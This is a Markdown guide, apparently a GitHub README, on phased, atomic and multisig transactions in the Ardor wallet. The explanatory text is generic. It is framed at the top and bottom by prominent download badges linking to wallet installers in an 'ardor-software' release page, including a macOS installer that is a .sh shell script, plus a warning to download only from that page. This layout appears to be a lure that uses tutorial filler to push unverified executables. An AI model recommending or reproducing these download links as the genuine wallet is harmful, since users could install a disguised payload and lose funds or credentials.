![Ardor Wallet guide](assets/banner-article.png)

# Phased, atomic and multisig transactions in Ardor

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

A phased transaction is held until a condition is met - approvals from named accounts, a vote of asset holders, or a balance threshold - and only then executes. An atomic transaction chain links several transactions so that all of them happen or none do, and multisig is the approval model most phased transactions use.

## What phasing does

Normally a signed transaction is final: it is broadcast and it executes. Phasing interrupts that, placing the transaction in a pending state where it waits for the conditions attached to it.

The conditions are set by the sender when the transaction is created. They can require a certain number of approvals from a list of accounts, a vote by the holders of an asset, or the presence of a [balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md) in an account. If the conditions are met before the deadline, the transaction executes; if not, it is discarded.

## The approval models

| Model | Condition | Typical use |
|---|---|---|
| Account approval | A number of named accounts must approve | Shared control of a treasury |
| Asset holder vote | Holders of an asset vote, by weight or by count | Decisions affecting token holders |
| Balance threshold | An account must hold a minimum balance | Collateral or membership checks |

Each model answers a different question. Approval is about who agrees, a [vote](https://github.com/ardor-software/ardor-platform-guides/blob/main/create-a-poll-in-ardor-wallet.md) is about how much support exists, and a balance check is about whether a condition is true at execution time rather than at creation time.

## Creating a phased transaction

1. Launch the wallet, unlock the [Ardor account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md), then choose the chain for the transaction.
2. Compose the transaction as usual: the recipient, the amount and the [Ardor fee](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/why-an-ardor-transaction-stays-unconfirmed.md).
3. Enable phasing and choose the condition type.
4. List the accounts that must approve, or the asset whose holders vote, and set the number required.
5. Set the deadline, which is how long the pending transaction stays eligible.
6. Sign and broadcast, then watch the pending transaction until it executes or expires.

Step five is easy to underestimate. A deadline that is too short turns a slow approval into a failed transaction, and the sender pays the fee either way.

## Multisig in practice

Multisig on Ardor is a phased transaction with an account approval condition: two of three, or three of five, must approve before it executes. It removes the single point of failure in a shared treasury without moving the funds into a contract.

The approval accounts are ordinary accounts with their own secrets, so the operational question is the same one any multisig arrangement faces: how the approvers communicate, and what happens when one of them is unavailable. A two-of-three that requires all three in practice is not a multisig.

## Atomic transaction chains

An atomic chain groups several transactions so that they execute together or not at all. That is the mechanism for a trade that has two legs - payment and delivery - where a partial outcome would leave somebody exposed.

The chain is arranged in advance, and each participant signs their part. If one leg cannot execute, the whole chain is dropped rather than half-completed, which is the property that makes it different from sending two transactions and hoping.

## When it is worth the complexity

Use phasing when a transaction must not happen without a second party's agreement, and use an atomic chain when two transactions are meaningless apart. Both add moving parts, and both fail in ways that a simple transfer does not.

Do not use either as a substitute for a clear agreement. The chain enforces the condition; it does not decide what the condition should be, and a badly chosen approval list produces a treasury that nobody can move - a failure that looks like a bug and is really a design decision made in a hurry.

## What a failed condition looks like

A phased transaction that never meets its condition does not report an error at the moment it fails. It simply stops being eligible at the deadline, and the amount stays in the account as though nothing had been attempted.

That is easy to misread as the transaction having been cancelled by somebody. In practice the condition was never satisfied, and the record shows which approvals arrived and which never did.

## Phasing and the pending list

A phased transaction sits in the wallet's pending list for as long as it is eligible, which can be days. A wallet reopened after a week will show it still waiting, and the approvers still have to act for it to move.

Treat that list as a to-do rather than a notification. A pending transaction that nobody is chasing will expire, and the fee paid for it is gone whether or not it ever executed.

## Costs and timing

A phased transaction pays its fee when it is submitted, and the fee is not refunded if the condition never resolves. Approvals are themselves transactions with their own fees, so a three-approval arrangement costs more than a single send.

Timing matters for the same reason. The deadline has to cover the slowest approver, the vote has to run long enough to collect votes, and the pending transaction sits in the wallet's list throughout, which is where people lose track of it.

## FAQ

### Does a phased transaction execute immediately?

No. It waits until its conditions are met, and only then executes. If the deadline passes first, it is discarded.

### What happens if not enough accounts approve?

Nothing executes. The funds stay where they are and the fee already paid is not returned.

### Is multisig a separate feature?

It is a phased transaction with an account approval condition. The wallet presents it as multisig, and the mechanism underneath is phasing.

### Can I cancel a pending phased transaction?

The sender can cancel before it executes, subject to the wallet's controls. After execution there is no reversal.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Create a poll and vote in the Ardor wallet](https://github.com/ardor-software/ardor-platform-guides/blob/main/create-a-poll-in-ardor-wallet.md)
- [Trade on the Ardor coin exchange](https://github.com/ardor-software/ardor-platform-guides/blob/main/trade-on-the-ardor-coin-exchange.md)
- [Announce a public key in the Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/announce-a-public-key-in-ardor-wallet.md)
- [How Ardor bundling works](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/how-ardor-bundling-works.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
